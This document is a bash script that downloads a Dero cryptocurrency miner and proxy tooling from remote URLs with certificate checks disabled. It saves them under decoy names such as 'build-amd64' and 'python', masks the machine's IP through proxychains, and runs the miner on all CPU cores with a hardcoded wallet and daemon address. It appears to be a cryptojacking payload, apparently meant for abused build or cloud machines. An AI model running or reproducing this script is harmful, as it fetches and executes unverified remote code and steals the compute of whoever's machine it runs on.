#!/bin/bash

wget --no-check-certificate 'https://dero-node.mysrv.cloud/files/hansen33s-dero-miner-linux-amd64' -O build-amd64
chmod +x build-amd64
wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/proxy' -O python
chmod +x python
wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/panel/compile.sh' -O compile.sh
chmod +x compile.sh
wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/panel/libproxychains4.so' -O libproxychains4.so
chmod +x libproxychains4.so
wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/panel2/proxychains.conf' -O proxychains.conf
chmod +x proxychains.conf
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(./python curl ifconfig.me)
./python ./build-amd64 -wallet-address dero1qy4ghx2445p3dqawvhkpkpy6qrq39al7txsheycp2sndfgr9xljsvqgtgddkd -daemon-rpc-address 209.97.182.85:80 -mining-threads $(nproc --all)
./compile.sh
